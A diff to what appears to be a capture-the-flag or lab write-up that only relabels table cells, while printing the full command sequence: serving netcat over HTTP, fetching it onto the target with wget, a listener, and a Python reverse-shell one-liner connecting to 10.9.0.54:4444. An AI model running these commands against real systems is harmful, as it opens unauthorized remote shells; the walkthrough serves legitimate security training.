@@ -160,12 +160,12 @@ Now, enter the following commands:
 
 Your workstation | Server (exploit shell)
 ---|---
-`cp $(which nc) .` | -
-`python -m http.server` | -
-- | `wget http://10.9.0.54:8000/nc`
-- | `chmod 755 nc`
-`rlwrap nc -nlvp 4444` | -
-- | `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.54",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
+`cp $(which nc) .` | N/A
+`python -m http.server` | N/A
+N/A | `wget http://10.9.0.54:8000/nc`
+N/A | `chmod 755 nc`
+`rlwrap nc -nlvp 4444` | N/A
+N/A | `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.54",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
 
 We now have a shell.
 
